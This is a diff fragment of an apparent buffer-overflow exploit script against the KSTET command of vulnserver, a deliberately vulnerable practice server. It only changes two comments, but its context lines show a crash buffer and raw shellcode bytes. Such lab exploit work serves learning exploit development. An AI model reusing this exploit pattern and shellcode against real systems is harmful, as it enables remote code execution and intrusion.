@@ -858,7 +858,7 @@ import time
 command = "KSTET "
 
 # 2000 bytes to crash vulnserver.exe
-# Software breakpoint to pause execution
+# Padding
 crash = "\x41" * 2
 
 # Creating file descriptor = 0x00000090
@@ -973,7 +973,7 @@ shell += "\xa6\x95\xbd\x9d\xff\xd5\x3c\x06\x7c\x0a\x80\xfb\xe0"
 shell += "\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x53\xff\xd5"
 
 # 2000 bytes to crash vulnserver.exe
-# Software breakpoint to pause execution
+# Padding
 crash = "\x41" * 2
 
 # Creating file descriptor = 0x00000090
